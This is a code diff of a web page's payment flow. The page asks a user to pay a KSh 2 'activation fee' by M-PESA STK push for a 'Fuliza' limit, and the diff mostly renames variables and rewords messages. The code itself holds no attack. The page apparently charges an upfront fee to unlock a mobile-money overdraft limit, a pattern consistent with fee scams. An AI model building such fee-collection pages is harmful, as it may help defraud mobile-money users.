@@ -210,7 +210,7 @@ button:disabled{
     color:#FFFFFF;
 
     font-size:13px;
-    font-weight:600;
+    font-weight:700;
 
     line-height:1.5;
     text-align:center;
@@ -310,8 +310,7 @@ button:disabled{
 
 <div class="notice">
 
-    Are you ready to pay the KSh 2 activation
-    fee? Choose an option below.
+    Are you ready to pay the KSh 2 activation fee?
 
 </div>
 
@@ -320,13 +319,13 @@ button:disabled{
     id="yesBtn"
     onclick="payActivation()"
 >
-    Yes, I'm Ready to Pay
+    Yes, Continue
 </button>
 
 <button
     type="button"
     id="noBtn"
-    onclick="cancelActivation()"
+    onclick="notNow()"
 >
     No, Not Now
 </button>
@@ -345,7 +344,7 @@ button:disabled{
 <script>
 
 /* =====================================================
-   EXISTING FULIZA BACKEND
+   YOUR EXISTING FULIZA BACKEND
 ===================================================== */
 
 const BACKEND_URL =
@@ -360,7 +359,7 @@ const ACTIVATION_FEE = 2;
 
 
 /* =====================================================
-   CUSTOMER DETAILS
+   LOAD CUSTOMER NAME
 ===================================================== */
 
 const savedName =
@@ -370,31 +369,20 @@ const savedName =
     "Applicant";
 
 
-const savedPhone =
-    localStorage.getItem(
-        "fulizaaPhoneNumber"
-    ) ||
-    localStorage.getItem(
-        "phoneNumber"
-    ) ||
-    "";
-
-
-/* =====================================================
-   DISPLAY NAME
-===================================================== */
-
-const firstName =
-    savedName
-        .trim()
-        .split(/\s+/)[0] ||
-        "Applicant";
-
-
 document.getElementById(
     "name"
 ).textContent =
-    firstName;
+    savedName;
+
+
+/* =====================================================
+   LOAD PHONE SAVED BY payment.html
+===================================================== */
+
+const savedPhone =
+    localStorage.getItem(
+        "fulizaaPhoneNumber"
+    ) || "";
 
 
 /* =====================================================
@@ -436,10 +424,6 @@ function normalizePhone(phone){
 }
 
 
-/* =====================================================
-   DISPLAY PHONE
-===================================================== */
-
 const phone =
     normalizePhone(
         savedPhone
@@ -454,26 +438,10 @@ document.getElementById(
 
 
 /* =====================================================
-   CREATE ACTIVATION REFERENCE
+   CUSTOMER CHOOSES NO
 ===================================================== */
 
-function createActivationReference(){
-
-    return (
-        "ACT-" +
-        Date.now()
-            .toString(36)
-            .toUpperCase()
-    );
-
-}
-
-
-/* =====================================================
-   CUSTOMER SELECTS NO
-===================================================== */
-
-function cancelActivation(){
+function notNow(){
 
     const message =
         document.getElementById(
@@ -494,12 +462,12 @@ function cancelActivation(){
 
 
 /* =====================================================
-   CUSTOMER SELECTS YES
+   PAY ACTIVATION
 ===================================================== */
 
 async function payActivation(){
 
-    const btn =
+    const yesBtn =
         document.getElementById(
             "yesBtn"
         );
@@ -518,7 +486,7 @@ async function payActivation(){
 
 
     /* -----------------------------------------
-       VALIDATE M-PESA NUMBER
+       PHONE VALIDATION
     ----------------------------------------- */
 
     if(
@@ -534,7 +502,7 @@ async function payActivation(){
 
 
     /* -----------------------------------------
-       CUSTOMER AGREED
+       CUSTOMER ACCEPTED
     ----------------------------------------- */
 
     localStorage.setItem(
@@ -544,11 +512,14 @@ async function payActivation(){
 
 
     /* -----------------------------------------
-       CREATE REFERENCE
+       CREATE UNIQUE REFERENCE
     ----------------------------------------- */
 
     const reference =
-        createActivationReference();
+        "ACT-" +
+        Date.now()
+            .toString(36)
+            .toUpperCase();
 
 
     localStorage.setItem(
@@ -567,11 +538,14 @@ async function payActivation(){
        DISABLE BUTTONS
     ----------------------------------------- */
 
-    btn.disabled = true;
+    yesBtn.disabled =
+        true;
 
-    noBtn.disabled = true;
+    noBtn.disabled =
+        true;
 
-    btn.textContent =
+
+    yesBtn.textContent =
         "Sending STK Push...";
 
 
@@ -580,15 +554,30 @@ async function payActivation(){
 
 
     /* -----------------------------------------
-       CALL EXISTING STK ENDPOINT
+       CALL YOUR EXISTING BACKEND
+       /api/stk-push
     ----------------------------------------- */
 
     try{
 
+        const selectedLimit =
+            Number(
+                localStorage.getItem(
+                    "fulizaaSelectedLimit"
+                ) ||
+                localStorage.getItem(
+                    "fulizaaSelectedSlot"
+                ) ||
+                0
+            );
+
+
         const response =
             await fetch(
+
                 BACKEND_URL +
                 "/api/stk-push",
+
                 {
 
                     method:"POST",
@@ -607,15 +596,7 @@ async function payActivation(){
                             ACTIVATION_FEE,
 
                         selectedLimit:
-                            Number(
-                                localStorage.getItem(
-                                    "fulizaaSelectedLimit"
-                                ) ||
-                                localStorage.getItem(
-                                    "fulizaaSelectedSlot"
-                                ) ||
-                                0
-                            ),
+                            selectedLimit,
 
                         fullName:
                             savedName,
@@ -626,6 +607,7 @@ async function payActivation(){
                     })
 
                 }
+
             );
 
 
@@ -654,7 +636,7 @@ async function payActivation(){
             }catch(error){
 
                 throw new Error(
-                    "Server returned an invalid response."
+                    "Backend returned an invalid response."
                 );
 
             }
@@ -669,7 +651,7 @@ async function payActivation(){
 
 
         /* -----------------------------------------
-           SERVER ERROR
+           BACKEND ERROR
         ----------------------------------------- */
 
         if(
@@ -681,7 +663,7 @@ async function payActivation(){
 
                 data.message ||
                 data.error ||
-                "Unable to send activation STK Push."
+                "Unable to send STK Push."
 
             );
 
@@ -689,7 +671,7 @@ async function payActivation(){
 
 
         /* -----------------------------------------
-           SAVE TRANSACTION
+           SAVE TRANSACTION ID
         ----------------------------------------- */
 
         if(
@@ -726,8 +708,8 @@ async function payActivation(){
            STK SENT
         ----------------------------------------- */
 
-        btn.textContent =
-            "Waiting for Payment...";
+        yesBtn.textContent =
+            "STK Sent";
 
 
         message.textContent =
@@ -735,7 +717,7 @@ async function payActivation(){
 
 
         /* -----------------------------------------
-           CHECK PAYMENT
+           START STATUS CHECK
         ----------------------------------------- */
 
         if(
@@ -744,12 +726,6 @@ async function payActivation(){
 
             checkActivationPayment(
                 data.transactionId
-            );
-
-        }else{
-
-            throw new Error(
-                "No transaction ID was returned."
             );
 
         }
@@ -763,18 +739,7 @@ async function payActivation(){
         );
 
 
-        localStorage.setItem(
-            "fulizaaActivationStatus",
-            "FAILED"
-        );
-
-
-        message.textContent =
-            error.message ||
-            "Activation payment request failed.";
-
-
-        btn.disabled =
+        yesBtn.disabled =
             false;
 
 
@@ -782,8 +747,13 @@ async function payActivation(){
             false;
 
 
-        btn.textContent =
-            "Yes, I'm Ready to Pay";
+        yesBtn.textContent =
+            "Yes, Continue";
+
+
+        message.textContent =
+            error.message ||
+            "Unable to send activation STK Push.";
 
     }
 
@@ -791,14 +761,14 @@ async function payActivation(){
 
 
 /* =====================================================
-   CHECK ACTIVATION PAYMENT
+   CHECK PAYMENT STATUS
 ===================================================== */
 
 function checkActivationPayment(
     transactionId
 ){
 
-    const btn =
+    const yesBtn =
         document.getElementById(
             "yesBtn"
         );
@@ -867,7 +837,7 @@ function checkActivationPayment(
 
 
                     console.log(
-                        "ACTIVATION STATUS:",
+                        "ACTIVATION PAYMENT STATUS:",
                         data
                     );
 
@@ -879,7 +849,7 @@ function checkActivationPayment(
 
 
                     /* ---------------------------------
-                       PAYMENT COMPLETED
+                       PAYMENT SUCCESS
                     --------------------------------- */
 
                     if(
@@ -910,33 +880,20 @@ function checkActivationPayment(
                         }
 
 
-                        btn.textContent =
-                            "Activation Successful";
+                        yesBtn.disabled =
+                            true;
 
 
                         noBtn.disabled =
                             true;
 
 
+                        yesBtn.textContent =
+                            "Activation Successful";
+
+
                         message.textContent =
                             "Congratulations! Your KSh 2 activation fee has been received successfully.";
-
-
-                        /*
-                         * Change this page name to whatever
-                         * your next page is called.
-                         */
-
-                        setTimeout(
-                            function(){
-
-                                window.location.replace(
-                                    "activation-success.html"
-                                );
-
-                            },
-                            1500
-                        );
 
 
                         return;
@@ -964,11 +921,7 @@ function checkActivationPayment(
                         );
 
 
-                        message.textContent =
-                            "The KSh 2 activation payment was not completed.";
-
-
-                        btn.disabled =
+                        yesBtn.disabled =
                             false;
 
 
@@ -976,9 +929,12 @@ function checkActivationPayment(
                             false;
 
 
-                        btn.textContent =
-                            "Yes, I'm Ready to Pay";
+                        yesBtn.textContent =
+                            "Yes, Continue";
 
+
+                        message.textContent =
+                            "The KSh 2 activation payment was not completed. Please try again.";
 
                         return;
 
@@ -999,11 +955,7 @@ function checkActivationPayment(
                         );
 
 
-                        message.textContent =
-                            "Payment confirmation is taking longer than expected. Please check your payment status before trying again.";
-
-
-                        btn.disabled =
+                        yesBtn.disabled =
                             false;
 
 
@@ -1011,8 +963,12 @@ function checkActivationPayment(
                             false;
 
 
-                        btn.textContent =
-                            "Yes, I'm Ready to Pay";
+                        yesBtn.textContent =
+                            "Yes, Continue";
+
+
+                        message.textContent =
+                            "Payment confirmation is taking longer than expected. Please check your M-PESA transaction before trying again.";
 
                     }
 
@@ -1026,9 +982,10 @@ function checkActivationPayment(
 
 
                     /*
-                     * Temporary status-request errors
-                     * do not immediately mark payment
-                     * as failed.
+                     * Do not immediately mark the
+                     * payment as failed because a
+                     * temporary status-request error
+                     * can occur.
                      */
 
                     if(
@@ -1041,11 +998,7 @@ function checkActivationPayment(
                         );
 
 
-                        message.textContent =
-                            "Unable to confirm the activation payment right now.";
-
-
-                        btn.disabled =
+                        yesBtn.disabled =
                             false;
 
 
@@ -1053,8 +1006,12 @@ function checkActivationPayment(
                             false;
 
 
-                        btn.textContent =
-                            "Yes, I'm Ready to Pay";
+                        yesBtn.textContent =
+                            "Yes, Continue";
+
+
+                        message.textContent =
+                            "Unable to confirm the activation payment right now.";
 
                     }
 
